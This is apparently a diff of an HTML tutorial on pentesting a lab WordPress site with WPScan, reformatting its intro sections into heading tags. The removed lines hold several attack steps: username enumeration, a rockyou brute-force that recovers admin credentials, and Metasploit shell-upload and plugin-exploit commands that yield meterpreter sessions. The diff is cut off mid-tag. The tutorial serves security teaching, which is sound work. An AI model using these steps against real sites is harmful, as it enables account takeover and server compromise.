@@ -1,1032 +1,561 @@
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: rgb(255, 0, 0);"><strong>🌐WordPress Penetration Testing🖧</strong></span></p>
-
-<p>Every other web-application on the internet is somewhere or other running over a&nbsp;<strong>Content Management System,&nbsp;</strong>either they use WordPress, Squarespace, Joomla, or any other in their development phase.&nbsp;<em>So is your website one of them?</em>&nbsp;In this guide, we’ll try to pentest such WordPress websites, with one of the most powerful WordPress vulnerability Scanner i.e&nbsp;<strong>WPScan.</strong></p>
-
+<h3><span style="color: #ff0000;"><strong>🌐WordPress Penetration Testing🖧</strong></span></h3>
+<h3>Every other web-application on the internet is somewhere or other running over a&nbsp;<strong>Content Management System,&nbsp;</strong>either they use WordPress, Squarespace, Joomla, or any other in their development phase.&nbsp;<em>So is your website one of them?</em>&nbsp;In this guide, we&rsquo;ll try to pentest such WordPress websites, with one of the most powerful WordPress vulnerability Scanner i.e&nbsp;<strong>WPScan.</strong></h3>
 <h3><strong>Content</strong></h3>
-
 <ul>
-  <li><strong>Introduction</strong></li>
-  <li><strong>Enumerating the WordPress web-application</strong>
-    <ul>
-      <li>Version Scanning</li>
-      <li>WordPress Themes</li>
-      <li>WordPress Plugins</li>
-      <li>WordPress Usernames</li>
-      <li>All in a single command</li>
-    </ul>
-  </li>
-  <li><strong>WordPress Exploitation</strong>
-    <ul>
-      <li>Bruteforce Attack using WPScan</li>
-      <li>Shell Upload using Metasploit</li>
-      <li>Vulnerable Plugin exploitation</li>
-    </ul>
-  </li>
-  <li><strong>Scanning over a Proxy Server</strong></li>
-  <li><strong>Scanning with an HTTP Authentication enabled</strong></li>
-</ul>
-
+<li>
 <h3><strong>Introduction</strong></h3>
-
-<p><em>“WordPress is one of the most powerful CMS platform, which covers about 35% of the total share of the websites over the internet”</em>. Thus in order to enumerate such web-applications, we’ll be using&nbsp;<strong>“WPScan” –</strong>&nbsp;which is a black box vulnerability scanner for WordPress, scripted in Ruby to focus on different vulnerabilities that are present in the WordPress applications, either in its themes or plugins.</p>
-
-<p>Well, WPScan comes preinstalled in Kali Linux, SamuraiWTF, Pentoo, BlackArch; which scans up its database in order to find out the outdated versions and the vulnerabilities in the target’s web application.</p>
-
-<p><strong>Let’s check out the major things that WPScan can do for us:</strong></p>
-
+</li>
+<li>
+<h3><strong>Enumerating the WordPress web-application</strong></h3>
 <ul>
-  <li>Detect the version of currently installed WordPress.</li>
-  <li>Can detect sensitive files like readme, robots.txt, database replacing files, etc.</li>
-  <li>Detect enabled features on currently installed WordPress server such as file_upload.</li>
-  <li>Enumerates the themes, plugins along with their versions and tells if they are outdated or not.</li>
-  <li>It even scans up the web-application to list out the available usernames.</li>
+<li>
+<h3>Version Scanning</h3>
+</li>
+<li>
+<h3>WordPress Themes</h3>
+</li>
+<li>
+<h3>WordPress Plugins</h3>
+</li>
+<li>
+<h3>WordPress Usernames</h3>
+</li>
+<li>
+<h3>All in a single command</h3>
+</li>
 </ul>
-
-<p><strong>Let’s start!!</strong></p>
-
-<p>As discussed earlier, WPScan is installed by default in the Kali Linux machines, so let’s check out the default usage options, by simply firing the following command in the terminal.</p>
-
-<pre>
-wpscan -hh</pre>
-
-<div class="se-component se-image-container __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-gqO8ZLD-zBo/XwzQBEjzhhI/AAAAAAAAlzI/Pl8or0KwANAm0STOp3HgFUEgSjyNz2TPQCLcBGAsYHQ/s1600/01.png" alt="" data-proportion="true" data-align="none" data-index="0" data-file-name="01.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-<br>
-
-<p><strong>Scanning the WordPress version of the target’s website</strong></p>
-
-<p>As we were presented with the default options, let’s now try to do a basic scan over the vulnerable WordPress web-application that we’ve set up in our earlier&nbsp;guide.</p>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-zmPuAUTUQ7g/XwzQFLtExVI/AAAAAAAAlzM/JSo15ptamXsHTEbShYWBpT7RyfQNno8WwCLcBGAsYHQ/s1600/02.png" alt="" data-proportion="true" data-align="none" data-index="1" data-file-name="02.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<p>Type the following command to scan the WordPress application and its server.</p>
-
-<pre>
-wpscan --url http://192.168.1.105/wordpress/</pre>
-From the below image you can see that it dumps up everything it could – the&nbsp;<strong>WordPress version</strong>, the&nbsp;<strong>Apache server,</strong>&nbsp;and even it also found that&nbsp;<strong>the upload directory has directory listing enables</strong>&nbsp;which means anyone can browse to&nbsp;<strong>“/wp-content/uploads”</strong>&nbsp;in order to check out the uploaded files and contents.<br>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-3dqqZOC8tlc/XwzQKBSRssI/AAAAAAAAlzQ/9aaOEaZ1e0ABzwplPrCeVHQ5-IPgBlmDwCLcBGAsYHQ/s1600/3.png" alt="" data-proportion="true" data-align="none" data-index="2" data-file-name="3.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<h3><strong>Enumerating WordPress Themes</strong></h3>
-
-<p>Themes play an important role in any CMS web-application, they control the general look &amp; feel of the website including its page layout, widget locations, and the default font and colour preferences.</p>
-
-<p>WPScan uses its database which contains about&nbsp;<strong>2600 themes</strong>&nbsp;to check the vulnerable installed one over the targets.&nbsp;</p>
-
-<p>In order to check the installed themes of the target’s WordPress web-application, type following command:</p>
-
-<pre>
-wpscan --url http://192.168.1.105/wordpresws/ -e at</pre>
-The&nbsp;<strong>“–e”&nbsp;</strong>flag is used for&nbsp;<strong>enumeration</strong>&nbsp;and the&nbsp;<strong>“at”&nbsp;</strong>flag returns&nbsp;<strong>“all themes”.</strong><br>
-
-<p>You can even use the other flags such as&nbsp;<strong>“vt”</strong>, to list only the&nbsp;<strong>vulnerable themes</strong>.</p>
-
-<p>Thus running the above command, we will be presented with the installed themes with its version.</p>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-oOeUid9T7kY/XwzQOYnQvyI/AAAAAAAAlzU/By5ysvCyDb4uJAhrzOuA_kk8hiT8zapNACLcBGAsYHQ/s1600/4.png" alt="" data-proportion="true" data-align="none" data-index="3" data-file-name="4.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-0_2OcBP_H18/XwzQR20jxMI/AAAAAAAAlzc/oLw7ChPNBgUaqya0rQ6WwA0C1Bbqj6FKgCLcBGAsYHQ/s1600/5.png" alt="" data-proportion="true" data-align="none" data-index="4" data-file-name="5.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<h3><strong>Enumerating WordPress Plugins</strong></h3>
-
-<p><strong>Plugins&nbsp;</strong>are the small piece of codes, that when added to a WordPress web-application, boost up the functionalities, and enhance the website’s features.</p>
-
-<p>But these plugins may sometimes cause great damage to the web-application due to their loosely written codes.</p>
-
-<p>Lets’s check out the installed plugins on our target’s web-application by executing the below command:</p>
-
-<pre>
-wpscan --url http://192.168.1.105/wordpress/ -e ap</pre>
-Similar to the themes, we can also check the&nbsp;<strong>vulnerable plugins</strong>&nbsp;by using the&nbsp;<strong>“-vp”&nbsp;</strong>flag.<br>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-QxGDfPUPM3s/XwzQVWI6COI/AAAAAAAAlzk/ojf868XBVw8YHlxqFrzEf416c2C7bVGQQCLcBGAsYHQ/s1600/6.png" alt="" data-proportion="true" data-align="none" data-index="5" data-file-name="6.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<p>After waiting for a few seconds, WPScan will dump our desired result. From the below image, you can see the plugins&nbsp;<strong>“mail-masta”&nbsp;</strong>and&nbsp;<strong>“reflex-gallery”</strong>&nbsp;are installed over our target’s website. As a bonus, we even get the&nbsp;<strong>last update&nbsp;</strong>and the&nbsp;<strong>latest version</strong>.</p>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-Y8cCXa_Kuyc/XwzQZCbSnxI/AAAAAAAAlzo/HztyQUcKp64-LEbiTSntBglCNCCLbMHFQCLcBGAsYHQ/s1600/7.png" alt="" data-proportion="true" data-align="none" data-index="6" data-file-name="7.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<h3><strong>Enumerating WordPress Usernames</strong></h3>
-
-<p>In order to list out usernames of our target’s website privileged users, execute the following command:</p>
-
-<pre>
-wpscan –url http://192.168.1.105/wordpress/ -e u</pre>
-The flag&nbsp;<strong>“u”&nbsp;</strong>&nbsp;will grab all the usernames and will present a list on our screen.<br>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-0p1EhklinrI/XwzQc2ypvnI/AAAAAAAAlzw/UbIyoxfDDMMBQPQwxqoFQjtRfnI30R9FgCLcBGAsYHQ/s1600/8.png" alt="" data-proportion="true" data-align="none" data-index="7" data-file-name="8.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<p>As WPScan completes its work, we’ll find a list of all the users with their user IDs, in accordance with how it grabbed them.</p>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-X2_Om1PXIYY/XwzQhRjYS7I/AAAAAAAAlz4/fu_NeVgia60wr0WMhjlVTThimRqPE-gxACLcBGAsYHQ/s1600/9.png" alt="" data-proportion="true" data-align="none" data-index="8" data-file-name="9.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<h3><strong>Enumerate ALL with a single command</strong></h3>
-
-<p>Does WPScan give us that privilege to scan up the web-applications to check everything in one go, whether it is its version, the installed themes, or the plugins?</p>
-
-<p>Let’s check this out!</p>
-
-<p>Fire up the following command to grab everything we scanned above for our target web-application.</p>
-
-<pre>
-wpscan --url http://192.168.1.105/wordpress/ -e at –e ap –e u</pre>
-<strong>–e: at:</strong>&nbsp;enumerate all themes of targeted website<br>
-
-<p><strong>–e: ap:</strong>&nbsp;enumerate all plugins of targeted website</p>
-
-<p><strong>–e: u:</strong>&nbsp;enumerate all usernames of targeted website</p>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-ARQG_Kxo94M/XwzQlJ1CLVI/AAAAAAAAl0E/iceRxitdITgLro7rm1hLDVr8bxKnWG0KQCLcBGAsYHQ/s1600/10.png" alt="" data-proportion="true" data-align="none" data-index="9" data-file-name="10.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<h3><strong>Brute-force attack using WPScan</strong></h3>
-
-<p>With the help of usernames which we enumerated earlier, we can create a&nbsp;<strong>word list</strong>&nbsp;of all the users and can try a brute-force login attack using the default password list as&nbsp;<strong>“rockyou.txt”</strong>.</p>
-
-<p>From the below image you can see our designed wordlist.</p>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-dlyUUnCoHH4/XwzQojfvSaI/AAAAAAAAl0I/uIZDKhOCTq04TMsfoXRFfBz1UFtW8f62QCLcBGAsYHQ/s1600/11.png" alt="" data-proportion="true" data-align="none" data-index="10" data-file-name="11.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<p>Let’s now try to exploit the website by defacing its login credentials using the following command:</p>
-
-<pre>
-wpscan --url http://192.168.1.105/wordpress/ -U user.txt -P /usr/share/wordlists/rockyou.txt</pre>
-The&nbsp;<strong>–U&nbsp;</strong>and the&nbsp;<strong>–P&nbsp;&nbsp;</strong>flags are used to set up the username list and the password list respectively.<br>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-sVNyXb3GGU4/XwzQr27SVOI/AAAAAAAAl0Q/y5GB6PUsZ2Ibv8Gfe3MWF3iP_MCUYXvEwCLcBGAsYHQ/s1600/12.png" alt="" data-proportion="true" data-align="none" data-index="11" data-file-name="12.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<p>It will start matching the valid combination of username and password and then dumps the result, from the given image you can see we found the login credentials.</p>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-2CxWplZSmbI/XwzQvvEUcRI/AAAAAAAAl0U/umk-CHqPFW4PkL3rnqchuGHseGtBMKvOwCLcBGAsYHQ/s1600/13.png" alt="" data-proportion="true" data-align="none" data-index="12" data-file-name="13.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<p>Great!! We got the&nbsp;<strong>admin&nbsp;</strong>credentials as&nbsp;<strong>“admin : jessica”.&nbsp;</strong>Let’s try to get into the application’s dashboard with them.</p>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-bXtHZs1xFpI/XwzQzPdCoOI/AAAAAAAAl0c/zL-fqaQlR0M62j-PP-tkN0hHetFyzBc9QCLcBGAsYHQ/s1600/14.png" alt="" data-proportion="true" data-align="none" data-index="13" data-file-name="14.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<h3><strong>Shell Upload using Metasploit</strong></h3>
-
-<p>Isn’t it great if you get the target’s shell?</p>
-
-<p>Run the following commands in order to get a meterpreter session of our target’s web-application.</p>
-
-<pre>
-msf &gt; use exploit/unix/webapp/wp_admin_shell_upload<br>
-msf exploit(wp_admin_shell_upload) &gt; set rhosts 192.168.1.105<br>
-msf exploit(wp_admin_shell_upload) &gt; set username admin<br>
-msf exploit(wp_admin_shell_upload) &gt; set password jessica<br>
-msf exploit(wp_admin_shell_upload) &gt; set targeturi /wordpress<br>
-msf exploit(wp_admin_shell_upload) &gt; exploit</pre>
-This module takes an administrator username and password, logs into the admin panel, and uploads a payload packaged as a WordPress plugin. And finally, give us the meterpreter session of the webserver.<br>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-QVVSz1QS18g/XwzQ232yr6I/AAAAAAAAl0k/DC5ioIqx87QrL0KMDfgvxypCbh3ywOlJQCLcBGAsYHQ/s1600/15.png" alt="" data-proportion="true" data-align="none" data-index="14" data-file-name="15.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<h3><strong>Vulnerable Plugin Exploitation</strong></h3>
-
-<p>Here in our website, we found a vulnerable plugin i.e.&nbsp;<strong>“slideshowgallery”</strong>&nbsp;which contains an authenticated file upload vulnerability thus in order to exploit it, we will be using the following module which will offer us a reverse shell.</p>
-
-<pre>
-use exploit/unix/webapp/wp_slideshowgallery_upload<br>
-msf exploit(wp_slideshowgallery _upload) &gt; set rhost 192.168.1.105<br>
-msf exploit(wp_ slideshowgallery _upload) &gt; set targeturi /wordpress<br>
-msf exploit(wp_ slideshowgallery _upload) &gt; set username admin<br>
-msf exploit(wp_ slideshowgallery _upload) &gt; set password jessica<br>
-msf exploit(wp_ slideshowgallery _upload) &gt; exploit</pre>
-From the below image you can see that we’ve successfully captured our target’s meterpreter session.<br>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-lAVmnZz6VLs/XwzQ63wrtZI/AAAAAAAAl0o/nwdcVC3cwEwxACz_LjfXWd4q7MMqaEKUQCLcBGAsYHQ/s1600/16.png" alt="" data-proportion="true" data-align="none" data-index="15" data-file-name="16.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
+</li>
+<li>
+<h3><strong>WordPress Exploitation</strong></h3>
+<ul>
+<li>
+<h3>Bruteforce Attack using WPScan</h3>
+</li>
+<li>
+<h3>Shell Upload using Metasploit</h3>
+</li>
+<li>
+<h3>Vulnerable Plugin exploitation</h3>
+</li>
+</ul>
+</li>
+<li>
 <h3><strong>Scanning over a Proxy Server</strong></h3>
-
-<p>Is it possible to scan a WordPress web-application running over a proxy server?</p>
-
-<p>Many web-applications use Proxy servers in order to be secure, but WPScan gives us this advantage to scan such web-applications using the&nbsp;<strong>“–proxy”&nbsp;</strong>flag.</p>
-
-<p>Let’s check it out how:</p>
-
-<p>Our WordPress web-application is now running over a proxy server with a&nbsp;<strong>“port number as 3128”.</strong></p>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-FHdtggwQhjE/XwzQ-jrJ1NI/AAAAAAAAl0s/bUI5MgcuoVEuwUtx7izTfeIE6j04B1bewCLcBGAsYHQ/s1600/17.png" alt="" data-proportion="true" data-align="none" data-index="16" data-file-name="17.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<p>Now if we try to scan it with the default usage option we’ll get an error and our scan will halt. So let’s try to use&nbsp;<strong>the proxy port</strong>&nbsp;in order to scan the web-application.</p>
-
-<p>Simply run the following command to&nbsp;<strong>bypass this proxy server</strong>:</p>
-
-<pre>
-wpscan --url http://192.168.1.105/wordpress/ --proxy http://192.168.1.105:3128</pre>
-From the below image you can see that we are back into the scanning section.<br>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-QSA4bhNGvk4/XwzRCRkJtdI/AAAAAAAAl0w/x4q26YzXom4poSHLPLRLlsdWz2ajfu8bQCLcBGAsYHQ/s1600/18.png" alt="" data-proportion="true" data-align="none" data-index="17" data-file-name="18.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
+</li>
+<li>
 <h3><strong>Scanning with an HTTP Authentication enabled</strong></h3>
-
-<p>Many websites enable HTTP authentication so that they can hide some essential and critical information from unauthenticated users.</p>
-
-<p>We have also set a similar validation over our website with the credentials as&nbsp;<strong>“raj : 123”.</strong>&nbsp;</p>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-BpMB_sgO0hI/XwzRH6mpWUI/AAAAAAAAl08/hz8itJSruukCsAK3aj7yiXIZ2MK0o1tRgCLcBGAsYHQ/s1600/19.png" alt="" data-proportion="true" data-align="none" data-index="18" data-file-name="19.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+</li>
+</ul>
+<h3><strong>Introduction</strong></h3>
+<h3><em>&ldquo;WordPress is one of the most powerful CMS platform, which covers about 35% of the total share of the websites over the internet&rdquo;</em>. Thus in order to enumerate such web-applications, we&rsquo;ll be using&nbsp;<strong>&ldquo;WPScan&rdquo; &ndash;</strong>&nbsp;which is a black box vulnerability scanner for WordPress, scripted in Ruby to focus on different vulnerabilities that are present in the WordPress applications, either in its themes or plugins.</h3>
+<h3>Well, WPScan comes preinstalled in Kali Linux, SamuraiWTF, Pentoo, BlackArch; which scans up its database in order to find out the outdated versions and the vulnerabilities in the target&rsquo;s web application.</h3>
+<h3><strong>Let&rsquo;s check out the major things that WPScan can do for us:</strong></h3>
+<ul>
+<li>
+<h3>Detect the version of currently installed WordPress.</h3>
+</li>
+<li>
+<h3>Can detect sensitive files like readme, robots.txt, database replacing files, etc.</h3>
+</li>
+<li>
+<h3>Detect enabled features on currently installed WordPress server such as file_upload.</h3>
+</li>
+<li>
+<h3>Enumerates the themes, plugins along with their versions and tells if they are outdated or not.</h3>
+</li>
+<li>
+<h3>It even scans up the web-application to list out the available usernames.</h3>
+</li>
+</ul>
+<h3><strong>Let&rsquo;s start!!</strong></h3>
+<h3>As discussed earlier, WPScan is installed by default in the Kali Linux machines, so let&rsquo;s check out the default usage options, by simply firing the following command in the terminal.</h3>
+<h3>wpscan -hh</h3>
+<div class="se-component se-image-container __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-gqO8ZLD-zBo/XwzQBEjzhhI/AAAAAAAAlzI/Pl8or0KwANAm0STOp3HgFUEgSjyNz2TPQCLcBGAsYHQ/s1600/01.png" alt="" data-proportion="true" data-align="none" data-index="0" data-file-name="01.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
-<p>From the below image you can see that when we tried the normal scan, we got an alert as&nbsp;<strong>“Please provide it with –http-auth”.</strong></p>
-
-<p>Thus following this alert, we’ve used the&nbsp;<strong>–http-auth</strong>&nbsp;and had entered our credentials.</p>
-
-<pre>
-wpscan --url http://192.168.1.105/wordpress/ --http-auth raj:123</pre>
-And there we go, our scan has been started now.<br>
-
+<h3>&nbsp;</h3>
+<h3><strong>Scanning the WordPress version of the target&rsquo;s website</strong></h3>
+<h3>As we were presented with the default options, let&rsquo;s now try to do a basic scan over the vulnerable WordPress web-application that we&rsquo;ve set up in our earlier&nbsp;guide.</h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-69B7UXvQpcw/XwzRL0kcaTI/AAAAAAAAl1E/fZttzpEY_7g6t_glgN94k17Nhrk3Z4yygCLcBGAsYHQ/s1600/20.png" alt="" data-proportion="true" data-align="none" data-index="19" data-file-name="20.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-zmPuAUTUQ7g/XwzQFLtExVI/AAAAAAAAlzM/JSo15ptamXsHTEbShYWBpT7RyfQNno8WwCLcBGAsYHQ/s1600/02.png" alt="" data-proportion="true" data-align="none" data-index="1" data-file-name="02.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
-<h1>Multiple Ways to Crack WordPress login</h1>
-
-<p>In this guide, you will be learning how to compromise a WordPress website’s credentials using different brute forcing techniques.</p>
-
+<h3>&nbsp;</h3>
+<h3>Type the following command to scan the WordPress application and its server.</h3>
+<h3>wpscan --url http://192.168.1.105/wordpress/</h3>
+<h3>From the below image you can see that it dumps up everything it could &ndash; the&nbsp;<strong>WordPress version</strong>, the&nbsp;<strong>Apache server,</strong>&nbsp;and even it also found that&nbsp;<strong>the upload directory has directory listing enables</strong>&nbsp;which means anyone can browse to&nbsp;<strong>&ldquo;/wp-content/uploads&rdquo;</strong>&nbsp;in order to check out the uploaded files and contents.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-3dqqZOC8tlc/XwzQKBSRssI/AAAAAAAAlzQ/9aaOEaZ1e0ABzwplPrCeVHQ5-IPgBlmDwCLcBGAsYHQ/s1600/3.png" alt="" data-proportion="true" data-align="none" data-index="2" data-file-name="3.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3><strong>Enumerating WordPress Themes</strong></h3>
+<h3>Themes play an important role in any CMS web-application, they control the general look &amp; feel of the website including its page layout, widget locations, and the default font and colour preferences.</h3>
+<h3>WPScan uses its database which contains about&nbsp;<strong>2600 themes</strong>&nbsp;to check the vulnerable installed one over the targets.&nbsp;</h3>
+<h3>In order to check the installed themes of the target&rsquo;s WordPress web-application, type following command:</h3>
+<h3>wpscan --url http://192.168.1.105/wordpresws/ -e at</h3>
+<h3>The&nbsp;<strong>&ldquo;&ndash;e&rdquo;&nbsp;</strong>flag is used for&nbsp;<strong>enumeration</strong>&nbsp;and the&nbsp;<strong>&ldquo;at&rdquo;&nbsp;</strong>flag returns&nbsp;<strong>&ldquo;all themes&rdquo;.</strong></h3>
+<h3>You can even use the other flags such as&nbsp;<strong>&ldquo;vt&rdquo;</strong>, to list only the&nbsp;<strong>vulnerable themes</strong>.</h3>
+<h3>Thus running the above command, we will be presented with the installed themes with its version.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-oOeUid9T7kY/XwzQOYnQvyI/AAAAAAAAlzU/By5ysvCyDb4uJAhrzOuA_kk8hiT8zapNACLcBGAsYHQ/s1600/4.png" alt="" data-proportion="true" data-align="none" data-index="3" data-file-name="4.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-0_2OcBP_H18/XwzQR20jxMI/AAAAAAAAlzc/oLw7ChPNBgUaqya0rQ6WwA0C1Bbqj6FKgCLcBGAsYHQ/s1600/5.png" alt="" data-proportion="true" data-align="none" data-index="4" data-file-name="5.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3><strong>Enumerating WordPress Plugins</strong></h3>
+<h3><strong>Plugins&nbsp;</strong>are the small piece of codes, that when added to a WordPress web-application, boost up the functionalities, and enhance the website&rsquo;s features.</h3>
+<h3>But these plugins may sometimes cause great damage to the web-application due to their loosely written codes.</h3>
+<h3>Lets&rsquo;s check out the installed plugins on our target&rsquo;s web-application by executing the below command:</h3>
+<h3>wpscan --url http://192.168.1.105/wordpress/ -e ap</h3>
+<h3>Similar to the themes, we can also check the&nbsp;<strong>vulnerable plugins</strong>&nbsp;by using the&nbsp;<strong>&ldquo;-vp&rdquo;&nbsp;</strong>flag.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
